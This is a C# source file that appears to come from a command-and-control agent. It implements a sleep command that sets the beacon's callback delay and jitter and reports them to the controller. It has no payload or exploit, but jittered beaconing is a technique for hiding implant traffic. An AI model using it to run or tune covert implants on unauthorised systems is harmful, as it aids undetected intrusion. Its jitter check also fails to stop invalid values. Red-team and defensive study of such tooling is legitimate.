using Agent.Communication;
using Agent.Models;
using Shared;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class SleepCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Sleep;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            if(context.Agent.MasterCommunicator is P2PCommunicator)
            {
                context.Error("Sleep is not supported in P2P Communication");
                return;
            }

            if (!task.HasParameter(ParameterId.Delay))
            {
                context.AppendResult($"Delay is {context.Agent.MetaData.Sleep}");
                return;
            }

            int delay = task.GetParameter<int>(ParameterId.Delay);
            int jitter = 0;
            if (task.HasParameter(ParameterId.Jitter))
            {
                jitter = task.GetParameter<int>(ParameterId.Jitter);
            }

            if(jitter < 0 || jitter >= 100)
            {
                context.Error("Jitter is not correct (should be 0-99%)");
            }

            context.Agent.MetaData.SleepInterval = delay;
            context.Agent.MetaData.SleepJitter = jitter;

            context.AppendResult($"Delay is set to {context.Agent.MetaData.Sleep}");
            await context.Agent.SendMetaData();
        }
    }
}
